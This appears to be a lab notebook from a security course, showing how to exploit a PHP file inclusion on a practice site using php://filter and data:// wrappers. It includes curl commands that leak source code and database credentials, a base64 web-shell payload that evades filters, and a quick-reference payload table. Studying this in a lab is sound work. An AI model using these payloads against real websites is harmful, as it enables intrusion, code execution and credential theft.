# php filter — reading admin.php

## No wrapper (baseline) — PHP executes, source hidden
Including `admin.php` directly renders the maintenance HTML but the `<body>` is never closed — a sign PHP was meant to run and isn't shown to us.
```
kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=admin.php
...
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

## php://filter, no encoding — same result
The PHP is still executed via the LFI, so we gain nothing over the baseline.
```
kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=php://filter/resource=admin.php
...
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

## php://filter + convert.base64-encode — source returned
Encoding the resource returns the raw source as base64 instead of executing it.
```
kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+...
...dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
```

## Decode locally with base64 -d
```
kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+...<snip>...PC9odG1sPgo=" | base64 -d
<!DOCTYPE html>
...
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);
...
```
>[!success] Loot
>Decoded source leaks MySQL creds (`root` / `M00nK4keCard!2#`). Reuse against the DB directly, or try the password against user accounts via SSH.

# data — code execution

## data://text/plain with URL-encoded PHP → runs `ls`
`<?php echo system('ls');?>` with spaces URL-encoded as `%20`.
```
kali@kali:~$ curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
...
admin.php
bavarian.php
css
fonts
img
index.php
js
...
```

## data://text/plain;base64 → filter bypass + cmd param
Base64 hides `system` from basic filters; `&cmd=` makes it a reusable command shell.
```
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

kali@kali:~$ curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```
>[!warning] Requires `allow_url_include = On`
>The `data://` wrapper will not work on a default PHP install. `php://filter` does not have this requirement.

# Quick reference

| Wrapper         | Goal                | Payload shape                                             | Config needed          |
| --------------- | ------------------- | -------------------------------------------------------- | ---------------------- |
| `php://filter`  | Read source         | `php://filter/convert.base64-encode/resource=admin.php`  | none                   |
| `data://` (txt) | RCE                 | `data://text/plain,<?php echo system('ls');?>`           | `allow_url_include=On` |
| `data://` (b64) | RCE + filter bypass | `data://text/plain;base64,<b64>&cmd=ls`                  | `allow_url_include=On` |
